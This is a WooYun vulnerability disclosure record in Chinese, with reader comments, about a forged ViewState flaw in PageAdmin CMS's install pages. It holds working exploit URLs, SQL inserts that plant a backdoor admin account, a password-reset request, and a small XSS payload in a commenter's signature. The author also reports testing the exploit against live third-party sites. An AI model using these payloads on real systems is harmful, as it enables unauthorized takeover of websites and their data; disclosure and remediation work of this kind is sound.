{"id": 2075, "wybug_id": "wooyun-2014-061699", "wybug_title": "PageAdmin可“伪造”VIEWSTATE从而执行任意SQL查询、可随意重置管理员密码", "wybug_corp": "PageAdmin", "wybug_author": "wefgod", "wybug_date": "2014-05-21 13:53", "wybug_open_date": "2014-08-16 13:54", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验", "逻辑错误", "设计不当导致攻击界面扩大", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-26：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向公众公开  简要描述： 漏洞都是在安装目录下，啥？你说install.lock了？完全木有影响啊！再怎么lock，都一样杀。此漏洞和之前的一些所谓越权是有比较大区别的。稍微用了下“语言特性”，俺还真是头一回发现这货原来还可以这样利用 详细说明：  先例行公事：官网：http://www.pageadmin.net/搜索引擎：https://www.google.de/#newwindow=1&q=PageAdmin+CMS,++All+Rights+Reserved&start=90搜索结果非常巨大，有点让我震惊，所以我才决定去试试看。好吧，直接插入吧！任意SQL查询先访问安装页面：http://www.youlu888.com/e/install/index.aspx\n\n提示已经lock了直接访问下面的链接（.NET的小“BUG”）：\nhttp://www.youlu888.com/e/install/index.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExODcwMDU5OTgPZBYCAgEPZBYCAgMPFgIeB1Zpc2libGVoZGQ%3D&ctl02=%E8%BF%90%E8%A1%8CSQL\n\n\n下面还提示要删除lock文件啊，忽视，随意输入点东西，执行：\n\n执行了！来一发（test2/admin不解释）：\ninsert into pa_member(id,username,userpassword,m_group) values(999,'test2','c868a64eabe1126d5b514afcf8dda46b17f','admin');\n同时再执行一个\ninsert into pa_adminpermission(site_id,uid) values(1,999);\n为什么要执行后面这个，请仔细想想表名的意思。另外site_id的信息可看下图：\n\n登录：\n\n好吧，看看官网吧：\nhttp://demo.pageadmin.net/e/install/index.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExODcwMDU5OTgPZBYCAgEPZBYCAgMPFgIeB1Zpc2libGVoZGQ%3D&ctl02=%E8%BF%90%E8%A1%8CSQL\n\n\n\n\n找一下后台，登录http://demo.pageadmin.net/e/master2007/login.aspx\n\n获取到物理路径：\n\n   漏洞证明：  管理员密码任意重置为了规避一些问题，这个操作我在本地搭建的环境进行。先看正常步骤，setup=4的时候是管理密码设置\n\n这里我设置为了123456，点击下一步的时候记得抓下数据包。当我再次执行访问setup=4的时候，已经提示lock了：\n\n根据我们前面获取到的VIEWSTATE，构造出下面的句子：\ne/install/index.aspx?setup=4?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExODcwMDU5OTgPZBYCAgEPZBYGAgEPFgIeB1Zpc2libGVoZAIDDxYCHwBoZAIJDxYCHwBnZGQ%3D&Login_Pass=admin&Login_Pass1=admin&ctl09=%E4%B8%8B%E4%B8%80%E6%AD%A5\nLogin_Pass=admin&Login_Pass1=admin就是把密码设置为admin了，访问之后：访问：\n\n呵呵一笑。说初始化完毕了，去后台登录，看看我们admin/admin是否修改成功：\n\n成功！如果觉得有疑问的，可以下载官方给出的包：http://file.pageadmin.net/v3.rar自行测试就知道了。好了，说点实在的东西，那这个\n__VIEWSTATE=%2FwEPDwULLTExODcwMDU5OTgPZBYCAgEPZBYCAgMPFgIeB1Zpc2libGVoZGQ%3D\n到底是怎么来的呢？其实很简单，自己本地搭建一个，然后访问获取到相关参数值即可。VIEWSTATE只是保存控件的一个状态，所以只要符合他加密的规律的他自然可以解开并还原控件的状态，然后就呵呵了其它请参阅：http://msdn.microsoft.com/zh-cn/library/ms227551(v=vs.80).aspx具体这个执行任意SQL查询到底还可以干什么？自己发挥想象了。管理员密码重置还挺直接的哈。   修复方案：  安装目录的每个tab页面添加一个token做随机数吧，同时，在做任意一个安装操作的时候，都检查是否有lock文件存在。为了安全嘛！   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-16 13:54 厂商回复：  漏洞Rank：20  (WooYun评价) 最新状态： 2014-05-26：CNVD将近期所有PageAdmin漏洞，一并向软件生产厂商通报处置。  ", "replys": "漏洞评价：\n评论\n     2014-05-21 13:57 |    \t\twhat_news \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:48        | 小菜一个 希望成为大菜)\t\t \n  牛    \n     2014-05-21 14:01 |    \t\t小新 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:19        | 我可是要成为普通白帽子的小新)\t\t \n  viewstate没验证吗？    \n     2014-05-21 14:02 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  技能点get    \n     2014-05-21 14:03 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @小新 木有哦。    \n     2014-05-21 14:06 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  @wefgod 打雷了！    \n     2014-05-21 14:09 |    \t\tcmd \t\t\t( 普通白帽子  |\t\t\t        Rank:192 漏洞数:18        )\t\t \n  果然可以啊，什么原理呢    \n     2014-05-21 14:09 |    \t\t小新 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:19        | 我可是要成为普通白帽子的小新)\t\t \n  @wefgod enableViewStateMac=\"false\"  给跪    \n     2014-05-21 14:16 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @小新 哈哈还是大牛你比我理解更深刻。高级程序员的？    \n     2014-05-21 14:16 |    \t\tabcdlzy \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:14        | 好好学习，天天向上。)\t\t \n  哎,这是乱用控件的结果么    \n     2014-05-21 14:17 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @cmd http://msdn.microsoft.com/zh-cn/library/ms227551(v=vs.80).aspx 这里有一些介绍。也有一些安全措施    \n     2014-05-21 14:21 |    \t\tcmd \t\t\t( 普通白帽子  |\t\t\t        Rank:192 漏洞数:18        )\t\t \n  我以为每次访问page_load都会触发呢，原来是这样    \n     2014-05-21 15:14 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  精华啊啊啊啊    \n     2014-05-21 15:50 |    \t\t溯雪 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        )\t\t \n  看成phpmyadmin了。。。顿时吓到了。。。原来是.net的程序    \n     2014-05-21 16:01 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  mark    \n     2014-05-21 16:33 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  给NET牛跪下了    \n     2014-05-21 16:35 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @小胖子 小新才是啊。他在上面呢    \n     2014-05-21 17:21 |    \t\tBlack World \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 无孔不入)\t\t \n  @wefgod 礼物先预订了 丷哈    \n     2014-05-21 18:05 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  第一眼看成phpmyadmin    \n     2014-05-21 18:44 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  @wefgod 围观尼玛被雷劈    \n     2014-05-21 20:15 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Black World 啥礼物……    \n     2014-05-22 17:30 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  这是要核心的节奏啊    \n     2014-05-22 18:42 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @magerx 这个不太可能。    \n     2014-05-26 15:28 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  @wefgod 忽略了    \n     2014-05-26 16:18 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Moc 最新状态：2014-05-26：CNVD将近期所有PageAdmin漏洞，一并向软件生产厂商通报处置。悲剧了。难道到点了？@疯狗    \n     2014-05-26 18:51 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod weekday    \n     2014-07-02 10:39 |    \t\tdepycode \t\t\t( 普通白帽子  |\t\t\t        Rank:275 漏洞数:44        | 关注网络安全，提高技术！)\t\t \n  好多钱    \n     2014-07-05 21:47 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:37        )\t\t \n  pageadmib的小bug还是.net的小bug？？    \n     2014-07-05 23:53 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @好基友一辈子 不是bug，配置问题。为了减轻服务器压力，从而导致了这个问题    \n     2014-07-06 01:50 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:37        )\t\t \n  @wefgod 求科普细节    \n     2014-07-07 15:43 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @好基友一辈子 http://msdn.microsoft.com/zh-cn/library/ms227551(v=vs.80).aspx 微软有说了很多这东西    \n     2014-07-15 12:54 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n     你怎么发的 都有好多钱啊   美元是怎么弄的呢    \n     2014-10-10 16:32 |    \t\tPageAdmin(乌云厂商)\t\t \n  PageAdmin 2014-10-10版已经修复次问题     \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}